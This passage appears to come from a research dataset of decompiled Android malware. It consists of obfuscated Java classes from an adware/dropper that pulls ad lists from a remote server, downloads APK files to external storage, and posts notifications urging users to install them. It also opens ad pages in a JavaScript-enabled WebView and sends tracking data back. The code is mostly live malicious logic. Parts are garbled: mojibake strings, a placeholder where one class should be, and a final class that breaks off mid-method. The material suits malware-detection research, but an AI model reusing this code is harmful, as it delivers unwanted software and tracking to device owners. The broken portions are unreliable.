ByteArrayInputStream(q.a(""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9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"")));               }  catch (              IOException e3) {                 e3.printStackTrace();               }               Intent intent=new Intent(""android.intent.action.VIEW"");               intent.setDataAndType(Uri.parse(""file://"" + str3),""application/vnd.android.package-archive"");               intent.addFlags(268435456);               PendingIntent activity=PendingIntent.getActivity(context,b,intent,134217728);               c.contentIntent=activity;               c.setLatestEventInfo(context,e2,e2 + ""ä¸‹è½½å®Œæˆ�\tç‚¹å‡»å®‰è£…"",activity);               Class<?> cls=Class.forName(""com.android.internal.R$id"");               int i=cls.getField(""title"").getInt(cls);               int i2=cls.getField(""text"").getInt(cls);               c.contentView.setImageViewBitmap(cls.getField(""icon"").getInt(cls),bitmap);               c.contentView.setTextViewText(i,e2);               c.contentView.setTextViewText(i2,e2 + ""ä¸‹è½½å®Œæˆ�\tç‚¹å‡»å®‰è£…"");               c.contentIntent=activity;               d.notify(b,c);             }             bitmap=a4;             Intent intent2=new Intent(""android.intent.action.VIEW"");             intent2.setDataAndType(Uri.parse(""file://"" + str3),""application/vnd.android.package-archive"");             intent2.addFlags(268435456);             PendingIntent activity2=PendingIntent.getActivity(context,b,intent2,134217728);             c.contentIntent=activity2;             c.setLatestEventInfo(context,e2,e2 + ""ä¸‹è½½å®Œæˆ�\tç‚¹å‡»å®‰è£…"",activity2);             Class<?> cls2=Class.forName(""com.android.internal.R$id"");             int i3=cls2.getField(""title"").getInt(cls2);             int i22=cls2.getField(""text"").getInt(cls2);             c.contentView.setImageViewBitmap(cls2.getField(""icon"").getInt(cls2),bitmap);             c.contentView.setTextViewText(i3,e2);             c.contentView.setTextViewText(i22,e2 + ""ä¸‹è½½å®Œæˆ�\tç‚¹å‡»å®‰è£…"");             c.contentIntent=activity2;             d.notify(b,c);           }  catch (          Exception e4) {             e4.printStackTrace();           }         }       }     }  catch (    Exception e5) {       e5.printStackTrace();     }   }   private static boolean j(  Context context){     String i=i(context);     return i.compareTo(""cmwap"") == 0 || i.compareTo(""3gwap"") == 0 || i.compareTo(""uniwap"") == 0;   }   private static Bitmap k(  Context context,  String str){     return BitmapFactory.decodeFile(context.getDir(""gboxfile"",0).getAbsolutePath() + File.separator + str);   }   private static void k(  Context context){     try {       Notification notification=new Notification();       c=notification;       notification.icon=R.drawable.stat_sys_download;       d=(NotificationManager)context.getSystemService(""notification"");     }  catch (    Exception e2) {       e2.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\f.code","public final class f implements Serializable {   private int a;   private int b;   private String c;   private String d;   private String e;   private String f;   private String g;   private String h;   private String i;   private int j;   private String k;   public f(){   }   public f(  JSONObject jSONObject){     try {       this.a=jSONObject.optInt(""icon"",1);       this.b=jSONObject.optInt(""downflag"",0);       this.c=jSONObject.optString(""title"","""");       this.d=jSONObject.optString(""adwords"","""");       this.e=jSONObject.optString(""image"","""");       this.f=jSONObject.optString(""adurl"","""");       this.g=jSONObject.optString(""pkg"","""");       this.h=jSONObject.optString(""adcodeid"","""");       this.i=jSONObject.optString(""showurl"","""");       this.k=jSONObject.optString(""token"","""");       this.j=jSONObject.optInt(""click"",0);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public final String a(){     return this.c;   }   public final String b(){     return this.d;   }   public final String c(){     return this.e;   }   public final String d(){     return this.f;   }   public final String e(){     return this.g;   }   public final String f(){     return this.h;   }   public final int g(){     return this.j;   }   public final int h(){     return this.b;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7fb28ed"
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\h.code","public final class h {   private static int a=700;   public static Animation a(){     AnimationSet animationSet=new AnimationSet(true);     ScaleAnimation scaleAnimation=new ScaleAnimation(1.0f,0.3f,1.0f,0.3f,1,0.5f,1,0.5f);     AlphaAnimation alphaAnimation=new AlphaAnimation(1.0f,0.0f);     animationSet.addAnimation(scaleAnimation);     animationSet.addAnimation(alphaAnimation);     animationSet.setDuration(500L);     animationSet.setFillAfter(true);     return animationSet;   }   public static Animation b(){     AnimationSet animationSet=new AnimationSet(true);     ScaleAnimation scaleAnimation=new ScaleAnimation(0.6f,1.0f,0.6f,1.0f,1,0.5f,1,0.5f);     AlphaAnimation alphaAnimation=new AlphaAnimation(0.0f,1.0f);     animationSet.addAnimation(scaleAnimation);     animationSet.addAnimation(alphaAnimation);     animationSet.setDuration(a);     animationSet.setFillAfter(true);     return animationSet;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\i.code","public final class i {   public static HashMap a=new HashMap();   private String b;   private Context c;   private String d;   private String e;   private String f;   private String g;   private File h;   private Notification k;   private NotificationManager l;   private Context m;   private View n;   private TextView o;   private boolean i=true;   private int j=8888;   private Handler p=new j(this);   public i(  Context context,  View view){     this.n=view;     this.m=context;     this.c=context.getApplicationContext();     try {       this.k=new Notification();       this.k.icon=R.drawable.stat_sys_download;       this.k.setLatestEventInfo(this.c,this.f,""ä¸‹è½½ä¸­...0%"",PendingIntent.getActivity(this.c,0,new Intent(this.c,(Class<?>)RemoteViews.class),0));       this.k.flags=16;       this.l=(NotificationManager)this.c.getSystemService(""notification"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   public static int a(  int i,  int i2){     if (i2 > 0) {       return Math.round((i * 100) / i2);     }     return 0;   }   public final void a(  String str,  String str2,  String str3){     if (knvu.c(this.c) != null) {       Intent intent=new Intent(this.c,(Class<?>)knvu.c(this.c));       intent.setAction(""ShowInstallReceiver"");       intent.putExtra(""pathUrl"",str);       intent.putExtra(""packagetitle"",str2);       intent.putExtra(""packagename"",str3);       this.k.flags=2;       this.k.icon=R.drawable.stat_sys_download_done;       this.k.setLatestEventInfo(this.c,str2,str2 + ""ä¸‹è½½å·²å®Œæˆ�\tç‚¹å‡»å®‰è£…"",PendingIntent.getBroadcast(this.c,this.j,intent,134217728));     }  else {       Intent intent2=new Intent(""android.intent.action.VIEW"");       intent2.setFlags(268435456);       intent2.setDataAndType(Uri.parse(""file://"" + str),""application/vnd.android.package-archive"");       this.k.icon=R.drawable.stat_sys_download_done;       this.k.setLatestEventInfo(this.c,str2,str2 + ""ä¸‹è½½å·²å®Œæˆ�\tç‚¹å‡»å®‰è£…"",PendingIntent.getActivity(this.c,this.j,intent2,134217728));     }     this.l.notify(this.j,this.k);   }   public final void b(  String str,  String str2,  String str3){     this.d=str;     this.f=str2;     this.b=str3;     if (e.a(this.c,str)) {       Context context=this.c;       PackageManager packageManager=context.getPackageManager();       new Intent();       context.startActivity(packageManager.getLaunchIntentForPackage(str));       return;     }     this.g=this.b.substring(this.b.lastIndexOf(""/"") + 1);     this.i=Environment.getExternalStorageState().equals(""mounted"");     if (this.i) {       this.e=Environment.getExternalStorageDirectory().getAbsolutePath() + ""/download/gbox/"";     }  else {       this.e=this.c.getCacheDir().getPath() + ""/"";     }     if (this.n != null) {       this.o=(TextView)this.n.findViewWithTag(str3);     }     String str4=this.e + this.g;     if (!a.containsKey(str)) {       this.h=new File(str4);       if (this.h.exists()) {         Toast.makeText(this.c,""å¼€å§‹ä¸‹è½½,è¯·ç¨�å€™..."",0).show();         new y(str,str2,this.g,this.p,this.h,this.m).start();         return;       }     }     if (a.containsKey(str) && ((t)a.get(str)).b() != u.c) {       Toast.makeText(this.c,""æ­£åœ¨ä¸‹è½½ä¸­..."",0).show();       return;     }     if (a.containsKey(str) && ((t)a.get(str)).b() == u.c) {       try {         t tVar=(t)a.get(this.d);         if (tVar != null) {           tVar.a();         }         Toast.makeText(this.c,""å¼€å§‹ä¸‹è½½,è¯·ç¨�å€™..."",0).show();         return;       }  catch (      Exception e) {         e.printStackTrace();         return;       }     }     t tVar2=new t(this.c,this.b,this.e,this.d,this.g,this.p,Boolean.valueOf(this.i).booleanValue() ? 1 : 0,str2);     tVar2.a(true);     t.a(this.c);     tVar2.start();     a.put(this.d,tVar2);     Toast.makeText(this.c,""å¼€å§‹ä¸‹è½½,è¯·ç¨�å€™..."",0).show();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\j.code","public final class j extends Handler {   final i a;   public j(  i iVar){     this.a=iVar;   }   @Override public final void handleMessage(  Message message){     Notification notification;     Context context;     Notification notification2;     NotificationManager notificationManager;     int i;     Notification notification3;     TextView textView;     TextView textView2;     Context context2;     Context context3;     Context context4;     String str;     TextView textView3;     TextView textView4;     String str2;     Context context5;     Context context6;     Context context7;     String str3;     TextView textView5;     TextView textView6;     String str4;     try {       Bundle data=message.getData();       String string=data.getString(""package_name"");       String string2=data.getString(""title"");       String string3=data.getString(""file_name"");       this.a.j=string.hashCode(); switch (message.what) { case 10001: case 10006:         if (i.a.containsKey(string)) {           i.a.remove(string);           context5=this.a.m;           String b=e.b(string,context5);           context6=this.a.m;           e.a(string,context6);           context7=this.a.m;           new aa(context7).execute(c.g,b);           StringBuilder sb=new StringBuilder();           str3=this.a.e;           this.a.a(sb.append(str3).append(string3).toString(),string2,string);           textView5=this.a.o;           if (textView5 != null) {             textView6=this.a.o;             str4=this.a.f;             textView6.setText(str4);             break;           }         }       break; case 10002:     int i2=data.getInt(""completed"");   int i3=data.getInt(""total""); i iVar=this.a; int a=i.a(i2,i3); if (a < 100) { notification=this.a.k; context=this.a.c; notification2=this.a.k; notification.setLatestEventInfo(context,string2,""ä¸‹è½½ä¸­..."" + a + ""%"",notification2.contentIntent); notificationManager=this.a.l; i=this.a.j; notification3=this.a.k; notificationManager.notify(i,notification3); textView=this.a.o; if (textView != null) { textView2=this.a.o; textView2.setText(""å·²å®Œæˆ�"" + a + ""%""); break; } }  else { if (i.a.containsKey(string)) { i.a.remove(string); } context2=this.a.m; e.a(string,context2); context3=this.a.m; String b2=e.b(string,context3); context4=this.a.m; new aa(context4).execute(c.g,b2); StringBuilder sb2=new StringBuilder(); str=this.a.e; this.a.a(sb2.append(str).append(string3).toString(),string2,string); textView3=this.a.o; if (textView3 != null) { textView4=this.a.o; str2=this.a.f; textView4.setText(str2); break; } } break; } super.handleMessage(message); }  catch (Exception e) { e.printStackTrace(); } } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\jgf.code","public class jgf extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     new m().onReceive(context,intent);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\k.code","public final class k {   public static HashMap a=new HashMap();   private String b;   private Context c;   private String d;   private String e;   private String f;   private File g;   private boolean h=true;   public k(  Context context){     this.c=context.getApplicationContext();   }   public final void a(  String str,  String str2,  String str3){     this.d=str;     this.b=str3;     if (e.a(this.c,str)) {       return;     }     this.f=this.b.substring(this.b.lastIndexOf(""/"") + 1);     this.h=Environment.getExternalStorageState().equals(""mounted"");     if (this.h) {       this.e=Environment.getExternalStorageDirectory().getAbsolutePath() + ""/download/gbox/"";     }  else {       this.e=this.c.getCacheDir().getPath() + ""/"";     }     String str4=this.e + this.f;     if (!a.containsKey(str)) {       this.g=new File(str4);       if (this.g.exists()) {         return;       }     }     if (!a.containsKey(str) || ((t)a.get(str)).b() == u.c) {       if (a.containsKey(str) && ((t)a.get(str)).b() == u.c) {         try {           t tVar=(t)a.get(this.d);           if (tVar != null) {             tVar.a();             return;           }           return;         }  catch (        Exception e) {           e.printStackTrace();           return;         }       }       t tVar2=new t(this.c,this.b,this.e,this.d,this.f,null,Boolean.valueOf(this.h).booleanValue() ? 1 : 0,str2);       tVar2.a(false);       t.a(this.c);       tVar2.start();       a.put(this.d,tVar2);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\kem.code","public class kem extends Activity implements Runnable {   ac b;   String c;   private Activity d;   private ak f;   private int g;   private ac i;   private WebView k;   private ProgressBar l;   boolean a=false;   private List e=new ArrayList();   private long h=0;   private Handler j=new ai(this);   public List a(  int i){     ArrayList arrayList=new ArrayList();     try {       Activity activity=this.d;       JSONObject jSONObject=new JSONObject(activity.getSharedPreferences(""aboxads_share"",0).getString(g.a(i),""""));       if (jSONObject.has(""timestamp"")) {         this.h=jSONObject.optLong(""timestamp"",0L);       }       JSONArray jSONArray=jSONObject.getJSONArray(""list"");       for (int i2=0; i2 < jSONArray.length(); i2++) {         d dVar=new d(jSONArray.getString(i2));         if (c.a.contains(dVar.h())) {           dVar.i();         }         arrayList.add(dVar);       }     }  catch (    JSONException e) {       e.printStackTrace();     }     return arrayList;   }   public static void a(  kem kemVar,  d dVar){     StringBuilder sb=new StringBuilder();     sb.append(""ps="" + dVar.k() + ""&"");     sb.append(""source="" + kemVar.g + ""&"");     new aa(kemVar.d).execute(c.d,sb.toString());   }   @Override public void finish(){     super.finish();   }   @Override public void onConfigurationChanged(  Configuration configuration){     super.onConfigurationChanged(configuration);   }   @Override protected void onCreate(  Bundle bundle){     if (this.d == null) {       super.onCreate(bundle);       requestWindowFeature(1);       this.d=this;     }     String action=this.d.getIntent().getAction();     if (e.a(action) || !""swapp"".equals(action)) {       this.g=this.d.getIntent().getIntExtra(""boxtype"",14);       this.c=this.d.getIntent().getStringExtra(""title"");       this.e=a(this.g);       if (this.b == null) {         this.b=new ac(this.d);         ((TextView)this.b.findViewById(1379161714)).setText(this.c);         GridView gridView=(GridView)this.b.findViewById(1379161712);         this.f=new ak(this);         this.f.a(gridView);         gridView.setAdapter((ListAdapter)this.f);       }       this.i=this.b;       this.d.setContentView(this.i);       if (e.a(this.d)) {         boolean z=System.currentTimeMillis() - this.h > 43200000;         if (this.e != null && this.e.isEmpty()) {           z=true;         }         if (z) {           if (a.a == null) {             a.a(this.d);           }           new Thread(this).start();         }         StringBuilder sb=new StringBuilder();         if (this.e != null && !this.e.isEmpty()) {           sb.append(""ps="" + ((d)this.e.get(0)).k() + ""&"");         }         sb.append(""source="" + this.g + ""&"");         new aa(this.d).execute(c.h,sb.toString());       }  else {         e.g(this.d);       }       this.i.startAnimation(h.b());       new ab();       ab.a(getApplicationContext());       return;     }     String stringExtra=this.d.getIntent().getStringExtra(""adurl"");     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);     RelativeLayout relativeLayout=new RelativeLayout(this.d);     relativeLayout.setBackgroundColor(-12303292);     relativeLayout.setLayoutParams(layoutParams);     this.k=new WebView(this.d);     this.k.setId(88);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-1);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(13);     this.k.setLayoutParams(layoutParams2);     this.l=new ProgressBar(this.d);     this.l.setEnabled(true);     this.l.setVisibility(0);     this.l.setLayoutParams(layoutParams3);     relativeLayout.addView(this.k);     relativeLayout.addView(this.l);     this.k.setScrollBarStyle(0);     this.k.setHorizontalScrollBarEnabled(false);     this.k.setVerticalScrollBarEnabled(false);     this.k.clearCache(true);     this.k.clearFormData();     this.k.clearHistory();     WebSettings settings=this.k.getSettings();     settings.setUserAgentString(null);     settings.setJavaScriptEnabled(true);     settings.setJavaScriptCanOpenWindowsAutomatically(true);     settings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NORMAL);     settings.setDatabaseEnabled(true);     settings.setDatabasePath(this.d.getDir(""database"",0).getPath());     this.k.requestFocus(130);     this.k.setWebViewClient(new aj(this));     this.d.setContentView(relativeLayout);     this.k.loadUrl(stringExtra);     String[] split=stringExtra.contains(""?"") ? stringExtra.split(""\\?"") : null;     if (split == null || split.length < 2) {       return;     }     StringBuilder sb2=new StringBuilder();     sb2.append(split[1] + ""&t=1&"");     new aa(this.d).execute(split[0],sb2.toString());   }   @Override protected void onDestroy(){     super.onDestroy();   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i != 4) {       return false;     }     if (this.k == null) {       Animation a=h.a();       a.setAnimationListener(new ah(this));       this.i.startAnimation(a);       return true;     }     if (this.k.canGoBack()) {       this.k.goBack();       return true;     }     this.d.finish();     return super.onKeyDown(i,keyEvent);   }   @Override protected void onRestart(){     super.onRestart();   }   @Override protected void onSaveInstanceState(  Bundle bundle){     super.onSaveInstanceState(bundle);   }   @Override protected void onStop(){     super.onStop();   }   @Override public void run(){     try {       StringBuilder sb=new StringBuilder();       sb.append(a.a.toString());       sb.append(""&source="" + this.g);       String a=e.a(this.d,c.c,sb.toString());       new StringBuilder().append(a.a.toString()).append(""?"").append(sb.toString());       if (!e.a(a)) {         try {           if (new JSONObject(a).has(""list"")) {             g.a(this.d,this.g,a);             this.j.sendEmptyMessage(1);           }         }  catch (        JSONException e) {           e.printStackTrace();         }       }     }  catch (    Exception e2) {       e2.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\knvu.code","public class knvu {   static boolean a=false;   private static knvu b;   private static Context c;   private static String d;   public static String a(  Context context){     if (d == null) {       d=e.b(context);     }     return d;   }   public static String b(  Context context){     return z.a(context,""channelid"","""");   }   public static Class c(  Context context){     if (context == null) {       return null;     }     String a2=z.a(context,""rename"","""");     if ("""".equals(a2)) {       return e.a(context,jgf.class);     }     try {       return Class.forName(a2);     }  catch (    ClassNotFoundException e) {       e.printStackTrace();       return null;     }   }   public static Class d(  Context context){     if (context == null) {       return null;     }     String a2=z.a(context,""acname"","""");     if ("""".equals(a2)) {       return e.b(context,kem.class);     }     try {       return Class.forName(a2);     }  catch (    ClassNotFoundException e) {       e.printStackTrace();       return null;     }   }   public static knvu getInstance(  Context context){     c=context.getApplicationContext();     if (b == null) {       b=new knvu();       e.d(context);     }     return b;   }   public static knvu getInstance(  Context context,  String str){     c=context.getApplicationContext();     if (b == null) {       b=new knvu();       e.d(context);     }     d=str;     e.c(str,c);     return b;   }   public static knvu getInstance(  Context context,  String str,  String str2){     c=context.getApplicationContext();     if (b == null) {       b=new knvu();       e.d(context);     }     d=str;     e.c(str,c);     e.d(str2,c);     return b;   }   public void setScType(  Context context,  boolean z,  boolean z2,  boolean z3,  boolean z4){     c.a().a(context,z,z2,z3,z4);   }   public void startbx(  Context context){     boolean 